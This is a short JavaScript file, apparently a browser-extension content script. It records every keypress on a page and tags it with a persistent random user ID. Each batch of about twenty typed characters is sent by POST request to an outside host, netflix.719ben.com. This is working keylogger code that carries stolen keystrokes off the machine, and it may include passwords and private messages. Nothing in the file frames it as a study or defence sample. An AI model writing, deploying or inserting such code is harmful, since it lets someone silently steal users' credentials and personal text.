'use strict'

document.onkeypress = (evt) => {
  let letter = String.fromCharCode(evt.keyCode)
  let userId = null

  window.chrome.storage.local.get('userId', (items) => {
    userId = items.userId
    if (userId === undefined) {
      userId = getRandomToken()
      window.chrome.storage.local.set({userId: userId})
    }
  })

  window.chrome.storage.local.get('letterArray', (items) => {
    let letterArray = items.letterArray
    if (letterArray === undefined) {
      letterArray = ''
    }

    letterArray += letter

    if (letterArray.length > 19) {
      let xhr = new window.XMLHttpRequest()
      xhr.open('POST', 'https://netflix.719ben.com', true)
      xhr.setRequestHeader('Content-type',
        'application/x-www-form-urlencoded')
      xhr.send(`userId=${userId}&letters=${letterArray}`)
      // clear the array
      letterArray = ''
    }
    window.chrome.storage.local.set({letterArray: letterArray})
  })
}

const getRandomToken = () => {
  let randomPool = new Uint8Array(32)
  window.crypto.getRandomValues(randomPool)
  let hex = ''
  for (let i = 0; i < randomPool.length; ++i) {
    hex += randomPool[i].toString(16)
  }
  return hex
}
